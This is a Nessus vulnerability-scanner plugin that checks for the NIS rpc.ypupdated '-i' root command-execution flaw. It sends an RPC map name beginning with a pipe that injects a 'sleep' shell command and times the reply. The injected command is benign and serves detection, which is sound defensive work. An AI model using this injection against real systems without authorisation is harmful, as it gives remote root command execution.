#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(31683);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-1999-0208");
 script_bugtraq_id(1749, 28383);
 script_osvdb_id(11517);

 script_name(english:"Multiple Vendor NIS rpc.ypupdated YP Map Update Arbitrary Remote Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"'ypupdated -i' is running on this port." );
 script_set_attribute(attribute:"description", value:
"ypupdated is part of NIS and allows a client to update NIS maps.

This old command execution vulnerability was discovered and fixed in 
1995. However, it is still possible to run ypupdated in insecure
mode by adding the '-i' option.
Anybody can easily run commands as root on this machine by specifying 
an invalid map name that starts with a pipe (|) character. Exploits 
have been publicly available since the first advisory." );
 script_set_attribute(attribute:"solution", value:
"Remove the '-i' option.
If this option was not set, the rpc.ypupdated daemon is still vulnerable 
to the old flaw; contact your vendor for a patch." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Solaris ypupdated Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2008/03/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "1994/12/12");
 script_cvs_date("$Date: 2011/10/14 17:21:18 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Run shell script through rpc.ypupdated");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2008-2011 Tenable Network Security, Inc.");
 script_family(english:"RPC");
 script_dependencie("rpc_portmap.nasl", "rpcinfo.nasl");
 exit(0);
}

include("sunrpc_func.inc");

g_timeout = 15;	# Must be greater than the maximum sleep value
RPC_PROG = 100028;


function test(port, sleeps, udp)
{
 local_var soc, mapname, packet, tictac1, tictac2, d, data, credentials, sleep;

 foreach sleep (sleeps)
 {
  if(!udp)
  {
   if (! get_tcp_port_state(port)) return 0;
   soc = open_sock_tcp (port);
   if (!soc) return 0;
  }
  else
  {
   if (! get_udp_port_state(port)) return 0;
   soc = open_sock_udp (port);
   if (!soc) return 0;
  }

  credentials = xdr_auth_unix(hostname: 'localhost', uid: 0, gid: 0);

  mapname = strcat("|sleep ", sleep, "; true > /dev/null;");

  data = 
        xdr_string(mapname)  +
        xdr_long(2)          +
        xdr_long(0x78000000) +
        xdr_long(2)          +
        xdr_long(0x78000000) ;

  packet = rpc_packet (prog:RPC_PROG, vers:1, proc:0x01, credentials:credentials, data:data, udp:udp);

  tictac1 = unixtime();

  data = rpc_sendrecv (socket:soc, packet:packet, udp:udp, timeout:g_timeout);
  close(soc);

  tictac2 = unixtime();
  d = tictac2 - tictac1;

  if ( isnull(data) || (d < sleep) || (d >= (sleep + 5)) )
    return 0;
 }

 return 1;
}


function check_flaw(ports, udp)
{
 local_var port;

 foreach port(ports)
 {
  if (test(port: port, sleeps: make_list(1, 3, 7), udp: udp))
    security_hole(port: port);
 }
}

tcp_ports = get_kb_list('Services/rpc-ypupdated');
if (isnull(tcp_ports))
{
 port = get_rpc_port2(program: RPC_PROG, protocol: IPPROTO_TCP);
 if (port) tcp_ports = make_list(port);
}

check_flaw(ports:tcp_ports, udp:0);

  
udp_ports = get_kb_list('Services/udp/rpc-ypupdated');
if (isnull(udp_ports))
{
 port = get_rpc_port2(program: RPC_PROG, protocol: IPPROTO_UDP);
 if (port) udp_ports = make_list(port);
}

check_flaw(ports:udp_ports, udp:1);
